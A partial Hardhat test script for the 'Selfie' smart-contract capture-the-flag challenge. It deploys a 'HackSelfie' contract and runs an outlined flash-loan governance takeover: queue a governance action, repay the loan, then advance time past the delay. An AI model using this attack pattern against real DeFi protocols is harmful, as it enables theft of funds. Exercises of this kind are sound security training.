...
describe("[Challenge] Selfie", function () {
  let deployer, player;
  let token, governance, pool, hack;
  ...
  before(async function () {
    ...
    hack = await (await ethers.getContractFactory("HackSelfie")).deploy(pool.address, governance.address);
  });
  ...
  it("Execution", async function () {
    ...
    // 2.  add queueAction to governance

    // 3. repay loan
    await hack.connect(player).hack();
    // 4. wait for governance delay
    await ethers.provider.send("evm_increaseTime", [86400 * 2 + 1]);
